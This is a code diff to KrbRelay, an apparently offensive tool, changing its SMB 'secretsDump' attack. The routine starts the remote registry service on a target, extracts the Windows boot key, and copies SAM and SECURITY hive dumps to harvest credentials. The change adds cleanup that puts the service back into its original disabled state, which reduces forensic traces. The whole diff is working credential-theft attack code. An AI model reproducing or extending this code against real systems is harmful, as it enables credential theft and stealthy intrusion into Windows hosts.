@@ -12,7 +12,7 @@ namespace KrbRelay.Clients.Attacks.Smb
     {
         public static void secretsDump(SMB2Client smbClient, bool saveToPwd = false)
         {
-            if (!ServiceManager.startService(smbClient, "remoteregistry\x00"))
+            if (!ServiceManager.startService(smbClient, "remoteregistry\x00", out bool wasStopped, out bool wasDisabled))
             {
                 Console.WriteLine("[-] Could not start remoteregistry");
                 return;
@@ -57,6 +57,19 @@ namespace KrbRelay.Clients.Attacks.Smb
                     bootKey[i] = scrambled[transforms[i]];
                 }
                 Console.WriteLine("[*] Bootkey: {0}", Helpers.ByteArrayToString(bootKey));
+
+                //
+                if (wasDisabled)
+                {
+                    if (!ServiceManager.setService(smbClient, "remoteregistry\x00", SERIVCE_STARTUP.SERVICE_DISABLED, wasStopped))
+                    {
+                        Console.WriteLine("[-] Could not change service config back to Disabled");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[*] Service back to original state");
+                    }
+                }
 
                 Shares.copyFile(smbClient, "windows\\temp\\sam.tmp", true, out byte[] bsam);
                 Shares.copyFile(smbClient, "windows\\temp\\sec.tmp", true, out byte[] bsec);
